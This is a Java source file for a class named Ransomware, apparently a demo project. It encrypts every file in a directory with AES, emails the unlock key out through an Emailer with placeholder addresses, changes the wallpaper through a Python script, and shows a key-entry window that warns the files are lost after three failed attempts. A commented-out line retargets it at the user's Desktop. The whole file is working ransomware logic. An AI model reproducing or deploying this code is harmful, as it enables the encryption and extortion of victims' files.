import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.UUID;

public class Ransomware extends JFrame {
    private final JLabel titleLabel;
    private final JLabel numberOfAttemptsLabel;
    private final JButton validateButton;
    private final JTextField keyField;
    private final JButton instructionButton;
    private File[] fileNames;
    private final AES aes = new AES();
    public static final String unlockKey = UUID.randomUUID().toString();
    private int attempts = 3;

    public Ransomware(){
        super("Ransomware");
        this.setSize(Constants.APP_WIDTH, Constants.APP_HEIGHT);
        this.setDefaultCloseOperation(EXIT_ON_CLOSE);
        this.setIconImage(Constants.ICON);
        this.setLocationRelativeTo(null);
        this.setResizable(false);
        this.setContentPane(new JLabel(new ImageIcon("data/background.gif")));
        this.setLayout(null);

        this.setFileNames();
        this.encryptFiles();

        Emailer emailer = new Emailer();
        emailer.setSender("sender@mail.com");
        emailer.setPassword("password");
        emailer.setRecipient("keyRecipient@mail.com");
        emailer.sendEmail();

        titleLabel = new JLabel("Ransomware");
        titleLabel.setBounds(273, 120, 148, 30);
        titleLabel.setFont(new Font("consolas", Font.BOLD, 25));
        titleLabel.setForeground(Constants.GREEN);
        this.add(titleLabel);

        numberOfAttemptsLabel = new JLabel("Attempts: " + this.attempts);
        numberOfAttemptsLabel.setBounds(5, 4, 100, 20);
        numberOfAttemptsLabel.setFont(new Font("consolas", Font.BOLD, 12));
        numberOfAttemptsLabel.setForeground(Constants.GREEN);
        this.add(numberOfAttemptsLabel);

        keyField = new JTextField();
        keyField.setBackground(Constants.DARK_GREY);
        keyField.setForeground(Constants.GREEN);
        keyField.setFont(new Font("consolas", Font.BOLD, 19));
        keyField.setBorder(null);
        keyField.setSelectionColor(Constants.GREEN);
        keyField.setCaretColor(Constants.GREEN);
        keyField.setBounds(245, 170, 200, 30);
        this.add(keyField);

        validateButton = new JButton("Validate");
        validateButton.setBackground(Constants.DARK_GREY);
        validateButton.setForeground(Constants.GREEN);
        validateButton.setFont(new Font("consolas", Font.BOLD, 12));
        validateButton.setFocusable(false);
        validateButton.setRolloverEnabled(false);
        validateButton.setBorder(null);
        validateButton.setBounds(306, 220, 75, 30);
        validateButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                checkUnlockKey();
            }
        });
        this.add(validateButton);

        instructionButton = new JButton("Instructions");
        instructionButton.setBackground(Constants.DARK_GREY);
        instructionButton.setForeground(Constants.GREEN);
        instructionButton.setFont(new Font("consolas", Font.BOLD, 12));
        instructionButton.setFocusable(false);
        instructionButton.setRolloverEnabled(false);
        instructionButton.setBorder(null);
        instructionButton.setBounds(5, 375, 100, 30);
        instructionButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                instruction(new File("data/instructions.txt"));
            }
        });
        this.add(instructionButton);

        this.changeWallpaper();
        this.setVisible(true);
    }

    private void changeWallpaper(){
        try{
            ProcessBuilder pb = new ProcessBuilder("python", new File("src/wp_script.py").getAbsolutePath());
            pb.start();
        }
        catch(IOException e){
            e.printStackTrace();
        }
    }

    private void checkAttempts(){
        switch(this.attempts){
            case 2:
                this.numberOfAttemptsLabel.setText("Attempts: " + this.attempts);
                this.numberOfAttemptsLabel.setForeground(Constants.AMBER);
                this.keyField.setText("");
                break;

            case 1:
                this.numberOfAttemptsLabel.setText("Attempts: " + this.attempts);
                this.numberOfAttemptsLabel.setForeground(Constants.RED);
                this.keyField.setText("");
                break;

            case 0:
                this.numberOfAttemptsLabel.setText("Over");
                this.numberOfAttemptsLabel.setForeground(Constants.GREEN);
                this.keyField.setText("");
                JOptionPane.showMessageDialog(this, "Your files are now lost" , "Files Lost", JOptionPane.PLAIN_MESSAGE);
                System.exit(0);
        }
    }

    private void encryptFiles(){
        if(this.fileNames != null)
            try {
                for(int i = 0; i < this.fileNames.length; i++) {
                    String filePath = this.fileNames[i].toString();
                    Path path = Paths.get(filePath);

                    byte[] fileData = Files.readAllBytes(path);
                    byte[] encryptedFileData = this.aes.encrypt(fileData);

                    FileOutputStream fos = new FileOutputStream(filePath);
                    fos.write(encryptedFileData);
                    fos.close();
                }
            }
            catch(IOException e){
                e.printStackTrace();
            }
    }

    private void decryptFiles(){
        if(this.fileNames != null)
            try {
                for(int i = 0; i < this.fileNames.length; i++) {
                    String filePath = this.fileNames[i].toString();
                    Path path = Paths.get(filePath);

                    byte[] fileData = Files.readAllBytes(path);
                    byte[] decryptedFileData = this.aes.decrypt(fileData);

                    FileOutputStream fos = new FileOutputStream(filePath);
                    fos.write(decryptedFileData);
                    fos.close();
                }
            }
            catch(IOException e){
                e.printStackTrace();
            }
    }

    private void setFileNames(){
        // File dir = new File(System.getProperty("user.home") + "\\Desktop");
        File dir = new File(new File("src/test").getAbsolutePath());
        File[] allFiles = dir.listFiles();
        ArrayList<File> tempFileList = new ArrayList<>();

        if(allFiles != null) {
            for(int i = 0; i < allFiles.length; i++) {
                if(allFiles[i].isFile()){
                    tempFileList.add(allFiles[i]);
                }
            }
        }
        this.fileNames = tempFileList.toArray(new File[0]);
    }

    private void checkUnlockKey(){
        if(!this.keyField.getText().equals("") && this.keyField.getText().strip().equals(Ransomware.unlockKey)){
            this.decryptFiles();
            JOptionPane.showMessageDialog(this, "Files have been decrypted", "Files Restored", JOptionPane.PLAIN_MESSAGE);
            this.dispose();
        }
        else{
            this.attempts--;
            this.checkAttempts();
        }
    }

    private void instruction(File instructionFile){
        String content = null;
        try {
            Path path = Paths.get(instructionFile.getAbsolutePath());
            content = Files.readString(path);
        }
        catch(IOException e){
            e.printStackTrace();
        }

        JFrame instructionFrame = new JFrame("Instructions");
        instructionFrame.setSize(Constants.INSTR_WIDTH, Constants.INSTR_HEIGHT);
        instructionFrame.setBackground(Constants.BLACK);
        instructionFrame.setLocationRelativeTo(null);
        instructionFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        instructionFrame.getContentPane().setBackground(Constants.BLACK);
        instructionFrame.setIconImage(Constants.ICON);

        JTextArea textArea = new JTextArea(content);
        textArea.setForeground(Constants.GREEN);
        textArea.setBackground(Constants.BLACK);
        textArea.setSelectionColor(Constants.GREEN);
        textArea.setFont(new Font("consolas", Font.PLAIN, 15));
        textArea.setEditable(false);
        instructionFrame.add(textArea);
        instructionFrame.setVisible(true);
    }
}
